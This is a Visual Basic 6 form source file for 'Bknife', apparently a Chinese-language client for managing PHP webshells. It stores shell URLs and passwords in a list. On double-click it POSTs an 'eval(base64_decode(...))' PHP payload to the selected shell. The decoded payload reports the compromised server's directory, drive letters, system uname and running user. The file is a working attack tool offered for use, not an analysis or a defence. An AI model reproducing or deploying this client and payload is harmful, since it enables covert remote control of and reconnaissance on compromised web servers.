VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Bknife"
   ClientHeight    =   5925
   ClientLeft      =   2370
   ClientTop       =   -47715
   ClientWidth     =   15345
   DrawStyle       =   1  'Dash
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5925
   ScaleWidth      =   15345
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  '屏幕中心
   Begin MSComctlLib.ListView ListView1 
      Height          =   5430
      Left            =   120
      TabIndex        =   0
      Top             =   45
      Width           =   15090
      _ExtentX        =   26617
      _ExtentY        =   9578
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      _Version        =   393217
      Icons           =   "ImageList1"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   0
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   10935
      Top             =   45
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   3
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":21E2
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":43D4
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":486E
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin VB.Menu option 
      Caption         =   "选项"
      Begin VB.Menu op1 
         Caption         =   "配置程序"
      End
   End
   Begin VB.Menu file 
      Caption         =   "生成器"
   End
   Begin VB.Menu about 
      Caption         =   "帮助"
      Begin VB.Menu aboutB 
         Caption         =   "关于Bknife"
      End
   End
   Begin VB.Menu one 
      Caption         =   "CommandLst"
      Begin VB.Menu look 
         Caption         =   "查看"
      End
      Begin VB.Menu additem 
         Caption         =   "添加"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False


'公共数据交换区域
Dim urltext As String

Private Sub aboutB_Click()
mee.Show 1
End Sub

Private Sub additem_Click()
add.Show 1
End Sub

Private Sub cmd2_Click()
If Len(Bk_txt1.text) = 0 Then
    MsgBox "您没有填写地址", , "提示"
    Exit Sub
Else
    Dim res As String
    Dim arr() As String
    
    urltext = Bk_txt1.text
    res = Hs_post(urltext, "echo")
    MsgBox res, , "res"
End If
End Sub


Function HttpPost(url As String, PostMsg As String) As String
     MsgBox url, , "发送请求!"
     Dim XmlHttp As Object
     Set XmlHttp = CreateObject("Msxml2.XMLHTTP")
     If Not IsObject(XmlHttp) Then
         Set XmlHttp = CreateObject("Microsoft.XMLHTTP")
         If Not IsObject(XmlHttp) Then Exit Function
     End If
     XmlHttp.Open "POST", url, False
     XmlHttp.SetRequestHeader "Content-Type", "text/html"
     XmlHttp.Send PostMsg
     Do While XmlHttp.readyState <> 4
         DoEvents
     Loop
     If XmlHttp.Status = 200 Then
         HttpPost = XmlHttp.ResponseText
     End If
End Function
Function Hs_post(url1 As String, text As String)
     '调用系统目录的HTTPS` 对象
     Set xmlHttps = CreateObject("WinHttp.WinHttpRequest.5.1")
     xmlHttps.Open "POST", url1, False
     xmlHttps.SetRequestHeader "Content-Type", "text/html"
     xmlHttps.SetRequestHeader "Content-Lenght", 1
      xmlHttps.Send text
     If xmlHttps.Status = 200 Then
         Hs_post = xmlHttps.ResponseText
     End If
 End Function




'---------------------------





'--------------------------


Private Sub Command4_Click()
add.Show 1
End Sub

Private Sub Command3_Click()

End Sub

Private Sub Command5_Click()
add.Show 1
End Sub





Private Sub Form_Load()
    ListView1.ListItems.Clear                                                   '清空列表                                           '清空列表头
    ListView1.View = lvwReport                                                  '设置列表显示方式
    ListView1.LabelEdit = lvwManual                                             '禁止标签编辑
    ListView1.FullRowSelect = True                                              '选择整行
    ListView1.FullRowSelect = True
    ListView1.Checkboxes = True
     '初始化三个列头，这里的宽度注意不要占满100%，会出现不美观的横向滚动条
    ListView1.ColumnHeaders.add , , "编号", 800
    ListView1.ColumnHeaders.add , , "类型", 900
    ListView1.ColumnHeaders.add , , "地址", 2780
    ListView1.ColumnHeaders.add , , "密码", 800
    ListView1.ColumnHeaders.add , , "状态", 1000
    ListView1.ColumnHeaders.add , , "创建时间", 1900
    ListView1.ColumnHeaders.add , , "修改时间", 1900
    ListView1.ColumnHeaders.add , , "备注", 1900
    ListView1.SmallIcons = ImageList1.Object
End Sub

Private Sub List1_Click()
MsgBox List1.ListIndex
End Sub

Private Sub ListView1_DblClick()
Dim select1 As Integer
Dim sone As String
Dim m1 As String
Dim m2 As String
Dim eva As String
Dim e2 As String
Dim e3 As String
select1 = ListView1.SelectedItem.Index
    Dim j As Integer
    For j = 1 To ListView1.ColumnHeaders.Count - 1
        Static S As String
        S = S + vbCrLf + ListView1.ListItems(select1).SubItems(j)
        info(j - 1) = S
        S = ""
    Next j
    m1 = Trim(info(2)) & "="
    'm2 = "ZWNobygiPnwiKTs7CiREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTsKaWYoJEQ9PSIiKQokRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7CiRSPSJ7JER9XHQiOwppZihzdWJzdHIoJEQsMCwxKSE9Ii8iKQp7CmZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpCmlmKGlzX2RpcigieyRMfToiKSkKJFIuPSJ7JEx9OiI7Cn0KJFIuPSJcdCI7CiR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOwokdXNyPSgkdSk/JHVbJ25hbWUnXTpAZ2V0X2N1cnJlbnRfdXNlcigpOwokUi49cGhwX3VuYW1lKCk7CiRSLj0iKHskdXNyfSkiOwpwcmludCAkUjs7CmVjaG8oInw8Iik7CmRpZSgpOw=="
    m2 = "ZWNobygiPnwiKTs7CiREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTsKaWYoJEQ9PSIiKQokRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7CiRSPSJ7JER9XHQiOwppZihzdWJzdHIoJEQsMCwxKSE9Ii8iKQp7CmZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpCmlmKGlzX2RpcigieyRMfToiKSkKJFIuPSJ7JEx9OiI7Cn0KJFIuPSJcdCI7CiR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOwokdXNyPSgkdSk/JHVbJ25hbWUnXTpAZ2V0X2N1cnJlbnRfdXNlcigpOwokUi49InwiLnBocF91bmFtZSgpLiJ8IjsKJFIuPSIoeyR1c3J9KSI7CnByaW50ICRSOzsKZWNobygifDwiKTsKZGllKCk7"
    e2 = m1 & "eval(base64_decode(" & Chr(34) & m2 & Chr(34) & "));"
    e3 = "eval(base64_decode(" & Chr(34) & m2 & Chr(34) & "));"
    sone = XMLHTTP_Post(ListView1.ListItems(select1).SubItems(2), e3)
    shellinfo.infos = sone
    shellinfo.urlone = ListView1.ListItems(select1).SubItems(2)
    shellinfo.Show (1)
End Sub

Private Sub ListView1_MouseDown(Button As Integer, hift As Integer, x As Single, y As Single)
    If Button = vbRightButton Then PopupMenu one
End Sub

Private Sub look_Click()
Dim N
If ListView1.ListItems.Count <> 0 Then N = ListView1.SelectedItem.Index Else MsgBox "当前为空", vbInformation, "警告:": Exit Sub
If N < 1 Then MsgBox "未选择任何一条shell", vbInformation, "警告:": Exit Sub
End Sub
